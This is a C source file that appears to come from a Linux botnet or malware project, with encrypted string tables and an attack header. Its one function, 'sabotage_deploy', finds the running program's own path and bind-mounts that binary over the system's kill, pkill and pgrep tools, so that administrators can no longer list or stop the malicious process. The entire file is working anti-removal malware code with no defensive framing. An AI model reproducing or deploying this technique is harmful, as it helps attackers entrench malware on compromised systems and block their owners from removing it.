#define _GNU_SOURCE
#include "headers/sabotage.h"
#include "../../utils/headers/includes.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/attack.h"
#include "../../utils/headers/syscalls.h"
#include "../../encryption/chacha20_table.h"

/* Missing function declarations */
int sys_readlink(char *path, char *buf, size_t bufsiz);
int sys_access(const char *pathname, int mode);
int sys_mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);

#ifndef MS_BIND
#define MS_BIND 4096
#endif

void sabotage_deploy(void) {
    char self_path[256];
    memset(self_path, 0, 256);
    
    int el = sys_readlink(enc[PROC_SELF_EXE].string, self_path, 255);
    if (el <= 0) return;
    self_path[el] = '\0';

    char *binaries[] = {enc[USR_BIN_KILL].string, enc[USR_BIN_PKILL].string, enc[USR_BIN_PGREP].string, NULL};

    for (int i = 0; binaries[i] != NULL; i++) {
        if (sys_access(binaries[i], 0 /*F_OK*/) == 0) {
            sys_mount(self_path, binaries[i], NULL, MS_BIND, NULL);
        }
    }
}
